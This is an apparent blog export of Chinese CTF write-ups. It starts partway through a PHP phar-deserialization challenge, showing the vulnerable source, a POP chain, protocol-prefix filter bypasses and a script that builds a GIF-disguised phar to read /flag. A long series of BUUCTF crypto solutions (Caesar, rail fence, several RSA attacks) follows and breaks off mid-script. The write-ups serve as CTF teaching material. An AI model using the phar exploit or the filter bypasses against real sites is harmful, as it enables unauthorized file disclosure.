mysqli($this-&gt;hostname, $this-&gt;dbuser, $this-&gt;dbpass, $this-&gt;database); if ($this-&gt;mysqli-&gt;connect_error) &#123; die(&quot;连接失败，错误:&quot; . $this-&gt;mysqli-&gt;connect_error); &#125; $sql=&quot;select id,password from users where username=?&quot;; $result=$this-&gt;mysqli-&gt;prepare($sql); $result-&gt;bind_param(&#x27;s&#x27;, $this-&gt;name); $result-&gt;execute(); $result-&gt;bind_result($idResult, $passwordResult); $result-&gt;fetch(); $result-&gt;close(); if ($this-&gt;token==&#x27;admin&#x27;) &#123; return $idResult; &#125; if (!$idResult) &#123; echo(&#x27;用户不存在!&#x27;); return false; &#125; if (md5($this-&gt;password)!==$passwordResult) &#123; echo(&#x27;密码错误！&#x27;); return false; &#125; $_SESSION[&#x27;token&#x27;]=$this-&gt;name; return $idResult; &#125; public function __destruct()&#123; echo $this-&gt;token; &#125;&#125;Class Upload&#123; public $flag; public $file; public $ext; function __construct()&#123; $this-&gt;flag = 1; $this-&gt;black_list = [&#x27;ph&#x27;, &#x27;ht&#x27;, &#x27;sh&#x27;, &#x27;pe&#x27;, &#x27;j&#x27;, &#x27;=&#x27;, &#x27;co&#x27;, &#x27;\\\\&#x27;, &#x27;&quot;&#x27;, &#x27;\\&#x27;&#x27;]; &#125; function check()&#123; $ext = substr($_FILES[&#x27;file&#x27;][&#x27;name&#x27;], strpos($_FILES[&#x27;file&#x27;][&#x27;name&#x27;], &#x27;.&#x27;)); $reg=implode(&quot;|&quot;,$this-&gt;black_list); $reg = &quot;/&quot; . $reg . &quot;\\x|\\s|[\\x01-\\x20]/i&quot;; if(preg_match($reg, $ext))&#123; $this-&gt;flag = 0; &#125; $this-&gt;ext = $ext; &#125; function __wakeup()&#123; $this-&gt;flag = 1; &#125; function upload()&#123; $this-&gt;file = $_FILES[&#x27;file&#x27;]; $this-&gt;check(); if($this-&gt;flag)&#123; if(isset($_FILES[&#x27;file&#x27;]))&#123; if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)&#123; echo &quot;Error: &quot; . $_FILES[&quot;file&quot;][&quot;error&quot;]; &#125; else&#123; if (file_exists(&quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))&#123; echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; already exists. &quot;; &#125; else&#123; if ($_FILES[&quot;file&quot;][&quot;size&quot;] &gt; 10240)&#123; echo &quot;too big&quot;; &#125; else&#123; $new_addr = $_SERVER[&#x27;DOCUMENT_ROOT&#x27;] . &quot;/upload/&quot; . md5($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]) . $this-&gt;ext; echo $new_addr; move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $new_addr); return $new_addr; &#125; &#125; &#125; &#125; &#125; else&#123; die(&quot;Noooooooooooooooooooooooooooo!&quot;); &#125; &#125;&#125;Class Reader&#123; public $filename; public $result; public function read($filename)&#123; if (preg_match(&quot;/flag/i&quot;,$filename))&#123; die(&quot;想多了嗷&quot;); &#125; if (preg_match(&quot;/sh/i&quot;,$filename))&#123; die(&quot;nooooooooooo!&quot;); &#125; if (preg_match(&quot;/^php|^file|^gopher|^http|^https|^ftp|^data|^phar|^smtp|^dict|^zip/i&quot;,$filename))&#123; die(&quot;Invid Schema!&quot;); &#125; echo file_get_contents($filename); &#125; public function __set($name,$val)&#123; echo file_get_contents($val);&#125;&#125; upload.php: 1234&lt;?php$user=new User();$user-&gt;upload();?&gt; read.php: 1234&lt;?php$user=new User();$user-&gt;read();?&gt; 明显phar反序列化，先看下pop链： 1dbCtrl::__destruct() -&gt; User::__toString() -&gt; $this-&gt;nickname-&gt;backup&#x3D;$this-&gt;backup -&gt; __set($name,$val) 就可以造成任意文件读取 123if (preg_match(&quot;/^php|^file|^gopher|^http|^https|^ftp|^data|^phar|^smtp|^dict|^zip/i&quot;,$filename))&#123; die(&quot;Invid Schema!&quot;);&#125; 限制了前缀，这个地方可以将其他协议流放在前面绕过，注意phar指向的文件不能没后缀 123compress.zlib:&#x2F;&#x2F;phar:&#x2F;&#x2F;upload&#x2F;a.gifcompress.bzip2:&#x2F;&#x2F;phar:&#x2F;&#x2F;upload&#x2F;a.gifphp:&#x2F;&#x2F;filter&#x2F;resource&#x3D;phar:&#x2F;&#x2F;upload&#x2F;a.gif exp: 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phpclass dbCtrl&#123; public $hostname=&quot;127.0.0.1&quot;; public $dbuser=&quot;p3rh4ps&quot;; public $dbpass=&quot;p3rh4ps&quot;; public $database=&quot;p3rh4ps&quot;; public $name; public $password; public $mysqli; public $token; public function __construct()&#123; $this-&gt;token = new User(); &#125;&#125;class User&#123; public $id; public $age=null; public $nickname=null; public $backup; public function __construct()&#123; $this-&gt;nickname = new Reader; $this-&gt;backup = &#x27;/flag&#x27;; &#125;&#125;Class Reader&#123; public $filename; public $result;&#125;$phar = new Phar(&quot;aaa.phar&quot;); //后缀名必须为 phar$phar-&gt;startBuffering();$phar -&gt; setStub(&#x27;GIF89a&#x27;.&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;);$object = new dbCtrl;$phar-&gt;setMetadata($object); //将自定义的 meta-data 存入 manifest$phar-&gt;addFromString(&quot;a.txt&quot;, &quot;a&quot;); //添加要压缩的文件//签名自动计算$phar-&gt;stopBuffering();","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.moonback.xyz/tags/writeup/"}]},{"title":"buuctf crypto部分题目writeup","slug":"buuctf-crypto部分题目writeup","date":"2020-09-21T12:00:41.000Z","updated":"2020-10-15T13:55:04.717Z","comments":true,"path":"2020/09/21/buuctf-crypto部分题目writeup/","link":"","permalink":"http://www.moonback.xyz/2020/09/21/buuctf-crypto%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/","excerpt":"学学密码学吧！菜的顶不住了😭","text":"学学密码学吧！菜的顶不住了😭 变异凯撒题目： 12加密密文：afZ_r9VYfScOeO_UL^RWUc格式：flag&#123; &#125; 直接用工具解发现没有合适的，看下凯撒密码的原理吧： 凯撒加密法，或称恺撒加密、恺撒变换、变换加密，是一种最简单且最广为人知的加密技术。它是一种替换加密的技术，明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。 所以，写个脚本： 12345678s=&#x27;afZ_&#x27;s1=&#x27;flag&#x27;for i,j in zip(s1,s): print(ord(i)-ord(j))# 5# 6# 7# 8 由此，我们可以写个解密flag的脚本： 123456789s=&#x27;afZ_r9VYfScOeO_UL^RWUc&#x27;for i in range(-26,26): k=i flag=&#x27;&#x27; for j in s: flag+=chr(ord(j)+k) k+=1 if &#x27;flag&#x27; in flag: print(flag) 篱笆墙的影子栅栏密码，解密脚本： 12345678910111213def decrypto(plain): for n in range(2,len(plain)-1): ans = &#x27;&#x27; for i in range(n): for j in range(int(plain.__len__() / n + 0.5)): try: ans += plain[j * n + i] except: pass print(n,ans) s=&#x27;felhaagv&#123;ewtehtehfilnakgw&#125;&#x27;decrypto(s) RSA题目： 12在一次RSA密钥对生成中，假设p&#x3D;473398607161，q&#x3D;4511491，e&#x3D;17求解出d作为flga提交 exp: 1234567import gmpy2p=473398607161q=4511491e=17d=gmpy2.invert(e,(p-1)*(q-1))print(d) 丢失的MD5以为和des有关🙃 12345678910import hashlib for i in range(32,127): for j in range(32,127): for k in range(32,127): m=hashlib.md5() flag=&#x27;TASC&#x27;+chr(i)+&#x27;O3RJMV&#x27;+chr(j)+&#x27;WDJKX&#x27;+chr(k)+&#x27;ZM&#x27; m.update(flag.encode()) des=m.hexdigest() if &#x27;e9032&#x27; in des and &#x27;da&#x27; in des and &#x27;911513&#x27; in des: print(des) Alice与Bob直接用网站分解：http://www.factordb.com 得到： 1101999 · 966233 rsarsa题目： 123456789Math is cool! Use the RSA algorithm to decode the secret message, c, p, q, and e are parameters for the RSA algorithm.p &#x3D; 9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483q &#x3D; 11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407e &#x3D; 65537c &#x3D; 83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034Use RSA to find the secret message exp: 12345678910import gmpy2p = 9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483q = 11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407e = 65537c = 83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034d = gmpy2.invert(e,(p-1)*(q-1))m = pow(c,d,p*q)print(m) 大帝的密码武器大帝就应该想到凯撒大帝： 当i=13时 发现输出security 123456789101112str1 = &#x27;FRPHEVGL&#x27;str2 = str1.lower() #转换为小写方便识别num = 1 #偏移量for i in range(26): print(&quot;&#123;:&lt;2d&#125;&quot;.format(num),end = &#x27; &#x27;) for temp in str2: if(ord(temp)+num &gt; ord(&#x27;z&#x27;)): #如果超出&#x27;z&#x27;,需要重新映射会a~z这26个字母上 print(chr(ord(temp)+num-26),end = &#x27;&#x27;) else: print(chr(ord(temp)+num),end = &#x27;&#x27;) num += 1 print(&#x27;&#x27;) exp: 12345678str = &#x27;ComeChina&#x27;for temp in str: if(ord(temp)+13 &gt; ord(&#x27;z&#x27;)): print(chr(ord(temp)+13-26),end = &#x27;&#x27;) else: print(chr(ord(temp)+13),end = &#x27;&#x27;)print(&#x27;&#x27;)# PbzrPuvan 传统知识+古典密码题目： 12345小明某一天收到一封密信，信中写了几个不同的年份 辛卯，癸巳，丙戌，辛未，庚辰，癸酉，己卯，癸巳。 信的背面还写有“+甲子”，请解出这段密文。key值：CTF&#123;XXX&#125; 六十甲子顺序表 对应的密文是： 128 30 23 8 17 10 16 30 后面提示+甲子，加上60得到： 188 90 83 68 77 70 76 90 exp: 1234s=&#x27;88 90 83 68 77 70 76 90&#x27;for i in s.split(&#x27; &#x27;): print(chr(int(i)),end=&#x27;&#x27;)# XZSDMFLZ 接着栅栏密码解密： 123456789101112131415161718def decrypto(plain): for n in range(2,len(plain)-1): ans = &#x27;&#x27; for i in range(n): for j in range(int(plain.__len__() / n + 0.5)): try: ans += plain[j * n + i] except: pass print(n,ans) s=&#x27;XZSDMFLZ&#x27;decrypto(s)# 2 XSMLZDFZ# 3 XDLZMZSF# 4 XMZFSLDZ# 5 XFZLSZDM# 6 XZSDMF 对第四栏凯撒密码解密得到类似明文，提交即为flag： 1SHUANGYU 信息化时代的步伐题目： 1606046152623600817831216121621196386 中文电报码：http://code.mcdvisa.com flag: 1计算机要从娃娃抓起 RSA1题目： 12345p &#x3D; 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229 q &#x3D; 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469 dp &#x3D; 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929 dq &#x3D; 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041 c &#x3D; 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852 泄露dp和dq，exp: 12345678910111213141516171819202122232425262728import gmpy2def hex_to_ascii(h): h = h.replace(&#x27;0x&#x27;,&#x27;&#x27;) list_s = [] for i in range(0, len(h), 2): list_s.append(chr(int(h[i:i+2], 16))) return &#x27;&#x27;.join(list_s)def ascii_to_hex(s): list_h = [] for c in s: list_h.append(str(hex(ord(c))[2:])) return &#x27;&#x27;.join(list_h)def decrypt(dp,dq,p,q,c): InvQ = gmpy2.invert(q, p) mp = pow(c, dp, p) mq = pow(c, dq, q) m = (((mp-mq)*InvQ) % p)*q+mq print(hex_to_ascii(str(hex(m))))p = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229 q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469 dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929 dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041 c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852decrypt(dp,dq,p,q,c) 凯撒？替换？呵呵!题目： 1MTHJ&#123;CUBCGXGUGXWREXIPOYAOEYFIGXWRXCHTKHFCOHCFDUCGTXZOHIXOEOWMEHZO&#125; quipqiup解密：https://quipqiup.com flag: 1flag&#123;substitutioncipherdecryptionisalwayseasyjustlikeapieceofcake&#125; old-fashion同样是quipqiup解密：https://quipqiup.com 萌萌哒的八戒猪圈密码及其变种： 权限获得第一步ntml哈希直接解 RSA3题目： 12345c1&#x3D;22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361n&#x3D;22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801e1&#x3D;11187289c2&#x3D;18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397e2&#x3D;9647291 共模攻击,exp： 123456789101112131415161718import gmpy2import libnumdef common_modulus(n, e1, e2, c1, c2): assert (libnum.gcd(e1, e2) == 1) _, s1, s2 = gmpy2.gcdext(e1, e2) m = pow(c1, s1, n) if s1 &gt; 0 else pow(gmpy2.invert(c1, n), -s1, n) m *= pow(c2, s2, n) if s2 &gt; 0 else pow(gmpy2.invert(c2, n), -s2, n) m %= n return mc1=22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361n=22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801e1=11187289c2=18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397e2=9647291print(libnum.n2s(common_modulus(n, e1, e2, c1, c2))) 世上无难事同样是quipqiup解密：https://quipqiup.com RSA2题目: 12345e &#x3D; 65537n &#x3D; 248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113dp &#x3D; 905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657c &#x3D; 140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751 泄露dp exp: 1234567891011121314151617181920import gmpy2import libnumdef getd(n,e,dp): for i in range(1,e): if (dp*e-1)%i == 0: if n%(((dp*e-1)//i)+1)==0: p=((dp*e-1)//i)+1 q=n//(((dp*e-1)//i)+1) phi = (p-1)*(q-1) d = gmpy2.invert(e,phi)%phi return de = 65537n = 248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113dp = 905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657c = 140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751d=getd(n,e,dp)m=pow(c,d,n)print(libnum.n2s(m)) 异性相吸题目： 123asadsasdasdasdasdasdasdasdasdasdqwesqfἇ̀Ј唒ဃ塔屋䩘卖剄䐃堂ن䝔嘅均ቄ䩝ᬔ 异性相吸，异或？可以看到两个文件大小是相等的 exp： 1234s1 = open(&#x27;1.txt&#x27;).read()s2 = open(&#x27;key.txt&#x27;).read()for i,j in zip(s1,s2): print(chr(ord(i)^ord(j)),end=&#x27;&#x27;) RSA给了两个文件flag.enc和pub.key,先提取出n和e，再用yafu分解出p和q 1234567from Crypto.PublicKey import RSApath = &#x27;pub.key&#x27;with open(path) as f: key = RSA.import_key(f.read()) print(&#x27;e = %d&#x27; % key.e) print(&#x27;n = %d&#x27; % key.n) 接着生成私钥,python2脚本： 123456789101112131415161718192021from Crypto.PublicKey import RSAkeypair = RSA.generate(1024)keypair.p = 304008741604601924494328155975272418463keypair.q = 285960468890451637935629440372639283459keypair.e = 65537keypair.n = keypair.p * keypair.q Qn = long((keypair.p-1) * (keypair.q-1)) i = 1while (True): x = (Qn * i ) + 1 if (x % keypair.e == 0): keypair.d = x / keypair.e break i += 1private = open(&#x27;private.pem&#x27;,&#x27;w&#x27;) private.write(keypair.exportKey()) private.close() 接着用openssl解密得到flag 1openssl rsautl -decrypt -in flag.enc -inkey private.pem -out flag.txt 还原大师题目： 1我们得到了一串神秘字符串：TASC?O3RJMV?WDJKX?ZM,问号部分是未知大写字母，为了确定这个神秘字符串，我们通过了其他途径获得了这个字串的32位MD5码。但是我们获得它的32位MD5码也是残缺不全，E903???4DAB????08?????51?80??8A?,请猜出神秘字符串的原本模样，并且提交这个字串的32位MD5码作为答案。 注意：得到的 flag 请包上 flag&#123;&#125; 提交 根据题意写脚本爆破就行 1234567891011121314151617import stringimport hashlibimport reBigStr = string.ascii_uppercases1 = &#x27;TASC&#123;&#125;O3RJMV&#123;&#125;WDJKX&#123;&#125;ZM&#x27;s2 = &#x27;E903???4DAB????08?????51?80??8A?&#x27;for i in BigStr: for j in BigStr: for k in BigStr: s = s1.format(i,j,k) smd5 = hashlib.md5(str(s).encode()).hexdigest() flag = re.search(s2.replace(&#x27;?&#x27;,&#x27;.&#x27;),smd5.upper()) if flag!=None: print(s,smd5.upper()) robomunication听出来是摩斯密码 1.... . .-.. .-.. --- .-- .... .- - .. ... - .... . -.- . -.-- .. - .. ... -... --- --- .--. -... . . .--. 解密得到 1HELLOWHATISTHEKEYITISBOOPBEEP flag 1flag&#123;BOOPBEEP&#125; RSAROLL题目： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&#123;920139713,19&#125;70479679275221115227470416418414022368270835483295235263072905459788476483295235459788476663551792475206804459788476428313374475206804459788476425392137704796792458265677341524652483295235534149509425392137428313374425392137341524652458265677263072905483295235828509797341524652425392137475206804428313374483295235475206804459788476306220148RSA roll！roll！roll！Only number and a-z（don&#39;t use editorwhich MS provide） 很明显可以猜到&#123;920139713,19&#125;是私钥，那些数字都是密文，exp: 12345678910111213141516171819202122232425262728293031323334353637383940import math# 分解大整数def moder(n): base=2 while base &lt;math.sqrt(n): if(n%base==0): fbase=base print(base,int(n/base)) base+=1 pass f=getEuler(fbase,int(n/fbase)) print(&#x27;f(n)欧拉函数值：%d&#x27;%f)# return f# 求欧拉函数f(n)def getEuler(prime1, prime2): return (prime1-1)*(prime2-1)# 求私钥ddef getDkey(e, Eulervalue):#可以辗转相除法 k = 1 while True: if (((Eulervalue * k) + 1) % e) == 0: (d,m)=divmod(Eulervalue * k + 1,e) return d#避免科学计数法最后转int失去精度 k += 1n=920139713d =getDkey(19, moder(n))print(&#x27;私钥为： %d&#x27;%d)c=[704796792,752211152,274704164,18414022,368270835,483295235,263072905,459788476,483295235,459788476,663551792,475206804, 459788476,428313374,475206804,459788476,425392137,704796792,458265677,341524652,483295235,534149509,425392137,428313374, 425392137,341524652,458265677,263072905,483295235,828509797,341524652,425392137,475206804,428313374,483295235,475206804,459788476,306220148]L=[]for x in c: L.append(pow(x,d,n))print(L)#明文ascii表for x in L: print(chr(x),end=&#x27;&#x27;) Cipher题目： 1还能提示什么呢？公平的玩吧（密钥自己找） Dncnoqqfliqrpgeklwmppu 注意：得到的 flag 请包上 flag&#123;&#125; 提交, flag&#123;小写字母&#125; 从公平玩吧联想到Playfair Cipher：http://rumkin.com/tools/cipher/playfair.php 直接解密，密码是playfair，注意要小写 Unencodeuuencode解密得到flag:http://ctf.ssleye.com/uu.html Dangerous RSA题目： 1234#n: 0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793L#e: 0x3#c:0x10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365so,how to get the message? 低加密指数小明文攻击，exp: 123456789import gmpy2import libnumn = 0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872e = 0x3c = 0x10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365m = gmpy2.iroot(c, 3)[0]print(libnum.n2s(m)) 达芬奇密码题目： 12达芬奇隐藏在蒙娜丽莎中的数字列:1 233 3 2584 1346269 144 5 196418 21 1597 610 377 10946 89 514229 987 8 55 6765 2178309 121393 317811 46368 4181 1 832040 2 28657 75025 34 13 17711 记录在达芬奇窗台口的神秘数字串:36968853882116725547342176952286 发现上面的数字列的个数和下面的数字串长度是一样的，都是32，仔细看上面，发现是斐波那契数列，并且是乱序的，猜测下面的和上面的顺序一样 12345678910111213141516s = &#x27;1 233 3 2584 1346269 144 5 196418 21 1597 610 377 10946 89 514229 987 8 55 6765 2178309 121393 317811 46368 4181 1 832040 2 28657 75025 34 13 17711&#x27;s1 = &#x27;36968853882116725547342176952286&#x27;n0 = 1 n1 = 1flag=&#x27;&#x27;li=[]for i in s.split(&#x27; &#x27;): li.append(i)flag+=s1[li.index(&#x27;1&#x27;)]flag+=s1[li.index(&#x27;1&#x27;,10)]while len(flag)&lt;32: n = n0+n1 n0=n1 n1=n flag+=s1[li.index(str(n))]print(flag) [AFCTF2018]Morse摩斯密码直接解 [HDCTF2019]basic rsa题目： 1234567891011121314151617import gmpy2from Crypto.Util.number import *from binascii import a2b_hex,b2a_hexflag = &quot;*****************&quot;p = 262248800182277040650192055439906580479q = 262854994239322828547925595487519915551e = 65533n = p*qc = pow(int(b2a_hex(flag),16),e,n)print c# 27565231154623519221597938803435789010285480123476977081867877272451638645710 就基本的RSA，exp: 12345678910import gmpy2import libnump = 262248800182277040650192055439906580479q = 262854994239322828547925595487519915551e = 65533c = 27565231154623519221597938803435789010285480123476977081867877272451638645710d = gmpy2.invert(e, (p-1)*(q-1))m = pow(c, d, p*q)print(libnum.n2s(m)) 传感器题目: 1234565555555595555A65556AA696AA6666666955这是某压力传感器无线数据包解调后但未解码的报文(hex) 已知其ID为0xFED31F，请继续将报文完整解码，提交hex。提示1：曼联 提示曼联，想到曼彻斯特密码，每8位反序 rsa2题目: 12345N = 101991809777553253470276751399264740131157682329252673501792154507006158434432009141995367241962525705950046253400188884658262496534706438791515071885860897552736656899566915731297225817250639873643376310103992170646906557242832893914902053581087502512787303322747780420210884852166586717636559058152544979471e = 46731919563265721307105180410302518676676135509737992912625092976849075262192092549323082367518264378630543338219025744820916471913696072050291990620486581719410354385121760761374229374847695148230596005409978383369740305816082770283909611956355972181848077519920922059268376958811713365106925235218265173085import hashlibflag = &quot;flag&#123;&quot; + hashlib.md5(hex(d)).hexdigest() + &quot;&#125;&quot; 维纳攻击 不知道为啥提交不对 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148import hashlibdef rational_to_contfrac (x, y): &#x27;&#x27;&#x27; Converts a rational x/y fraction into a list of partial quotients [a0, ..., an] &#x27;&#x27;&#x27; a = x//y if a * y == x: return [a] else: pquotients = rational_to_contfrac(y, x - a * y) pquotients.insert(0, a) return pquotientsdef convergents_from_contfrac(frac): &#x27;&#x27;&#x27; computes the list of convergents using the list of partial quotients &#x27;&#x27;&#x27; convs = []; for i in range(len(frac)): convs.append(contfrac_to_rational(frac[0:i])) return convsdef contfrac_to_rational (frac): &#x27;&#x27;&#x27;Converts a finite continued fraction [a0, ..., an] to an x/y rational. &#x27;&#x27;&#x27; if len(frac) == 0: return (0,1) elif len(frac) == 1: return (frac[0], 1) else: remainder = frac[1:len(frac)] (num, denom) = contfrac_to_rational(remainder) # fraction is now frac[0] + 1/(num/denom), which is # frac[0] + denom/num. return (frac[0] * num + denom, num)def egcd(a,b): &#x27;&#x27;&#x27; Extended Euclidean Algorithm returns x, y, gcd(a,b) such that ax + by = gcd(a,b) &#x27;&#x27;&#x27; u, u1 = 1, 0 v, v1 = 0, 1 while b: q = a // b u, u1 = u1, u - q * u1 v, v1 = v1, v - q * v1 a, b = b, a - q * b return u, v, adef gcd(a,b): &#x27;&#x27;&#x27; 2.8 times faster than egcd(a,b)[2] &#x27;&#x27;&#x27; a,b=(b,a) if a&lt;b else (a,b) while b: a,b=b,a%b return adef modInverse(e,n): &#x27;&#x27;&#x27; d such that de = 1 (mod n) e must be coprime to n this is assumed to be true &#x27;&#x27;&#x27; return egcd(e,n)[0]%ndef totient(p,q): &#x27;&#x27;&#x27; Calculates the totient of pq &#x27;&#x27;&#x27; return (p-1)*(q-1)def bitlength(x): &#x27;&#x27;&#x27; Calculates the bitlength of x &#x27;&#x27;&#x27; assert x &gt;= 0 n = 0 while x &gt; 0: n = n+1 x = x&gt;&gt;1 return ndef isqrt(n): &#x27;&#x27;&#x27; Calculates the integer square root for arbitrary large nonnegative integers &#x27;&#x27;&#x27; if n &lt; 0: raise ValueError(&#x27;square root not defined for negative numbers&#x27;) if n == 0: return 0 a, b = divmod(bitlength(n), 2) x = 2**(a+b) while True: y = (x + n//x)//2 if y &gt;= x: return x x = ydef is_perfect_square(n): &#x27;&#x27;&#x27; If n is a perfect square it returns sqrt(n), otherwise returns -1 &#x27;&#x27;&#x27; h = n &amp; 0xF; #last hexadecimal &quot;digit&quot; if h &gt; 9: return -1 # return immediately in 